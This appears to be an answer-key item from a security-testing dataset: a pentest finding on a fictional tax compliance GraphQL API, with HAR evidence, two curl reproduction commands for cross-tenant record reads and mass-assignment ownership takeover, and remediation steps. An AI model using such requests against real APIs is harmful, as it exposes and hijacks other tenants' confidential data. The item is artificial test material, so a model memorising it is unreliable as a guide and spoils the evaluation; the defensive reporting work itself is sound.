# Expected Response

## System
- Domain: Tax Compliance / RegTech
- System: TaxGrid Compliance API
- Example ID: GQL-0098

## Priority Findings

### Finding 1: Tax Compliance Record Mass Assignment — Cross-Tenant Tax Data Takeover (Pattern 1.12)
**Severity:** Critical
**Category:** BOLA / Mass Assignment

**Summary:**
Per §5.0 (Pattern 1.12 — mass assignment via object fields): The `listResources` resolver trusts client-supplied `tenantId`, and mutations accept client-writable `ownerId`/`tenantId` fields. An attacker from `tenant-d831` passed `tenantId: "tenant-3697"` to enumerate tax compliance records. In a tax compliance platform, this exposes tax filings, VAT/GST calculations, financial statements, and audit trails protected under tax secrecy laws and GDPR Article 9.

**Evidence from HAR:**
- Request: `POST https://api.taxgrid-complianc.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-d831`
- Query: `listResources(tenantId: "tenant-3697") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-3697"`, `ownerId: "other-user-d8313697"`, `sensitiveField: "CONFIDENTIAL-d8313697"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-d8313697`

## Steps to Reproduce

### Step 1 — Cross-tenant tax record list (HAR)
```bash
curl -s -X POST https://api.taxgrid-complianc.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-d831" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-3697\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-d8313697` tax data from `tenant-3697`. **Secure:** FORBIDDEN.

### Step 2 — Mass assignment to tax record
```bash
curl -s -X POST https://api.taxgrid-complianc.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-d831" \
  -d '{"query": "mutation { updateResource(id: \"R-2098\", input: {status: \"filed\", ownerId: \"attacker-d8313697\", tenantId: \"tenant-3697\"}) { resourceId status } }"}'
```
**Vulnerable:** Mass assignment of `ownerId`/`tenantId` accepted — tax record ownership transferred.

## Remediation
1. `listResources` must use JWT `tenantId` — discard client argument.
2. Strip `ownerId`, `tenantId` from all `ResourceInput` types.
3. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
